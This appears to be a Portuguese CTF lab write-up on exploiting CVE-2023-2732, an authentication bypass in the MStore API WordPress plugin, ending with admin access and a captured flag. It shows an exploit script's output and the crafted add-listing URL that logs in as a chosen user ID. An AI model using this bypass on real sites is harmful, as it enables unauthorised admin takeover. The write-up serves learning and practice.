# Wordpress CVE

## Reconhecimento

- Após uma verificação da aplicação web, conseguimos obter informações importantes a ser exploradas.

|            Feature             |    Version   |
|--------------------------------|--------------|
| Wordpress                      | 5.8.1        |
| MStore API                     | 3.9.0        |
| WooCommerce plugin             | 5.7.1        |
| Booster for WooCommerce plugin | 5.4.4        |


- Possíveis utilizadores:

    1. admin
    
    2. Orval Sanford

## Vulnerabilidades

- O CVE encontrado foi o CVE-2023-2732.

- O plugin MStore API para WordPress é vulnerável a uma falha de autenticação nas versões até `3.9.2` 

- Isto deve-se à verificação insuficiente do utilizador fornecido durante a solicitação da API REST para adicionar listagens através do plugin. 

- Isto torna possível para atacantes não autenticados entrarem como qualquer utilizador existente no site, como um `admin`, se tiverem acesso ao ID do utilizador.

## Exploit

- Conhecida a vulnerabilidade, iniciámos a procura de um exploit ideal para explorar o CVE.


```
python3 mstore-api.py -u http://wordpress.lan


The plugin version is below 3.9.3.
Select a user:
1. admin
Enter the user ID: 1



Congratulations a vulnerable system has been found.

How to Exploit:

Visit the following url: http://wordpress.lan/wp-json/wp/v2/add-listing?id=1
Visit  http://wordpress.lan and you should be logged in as the user you have chosen.
```

- Substituímos o url exemplo pelo url pretendido.

```
http://143.47.40.175:5001/wp-json/wp/v2/add-listing?id=1
```

- Desta maneira, ao visitarmos de novo o site, foi possível autenticar como `admin`.

## Ataque

- Agora na conta do admin, foi possível ter acesso a todo o tipo de informação privilegiada do site.

- Ao analisar um post privado, encontrámos a flag pretendida `flag{byebye}`.

![image](screenshots/CTF3_1.png)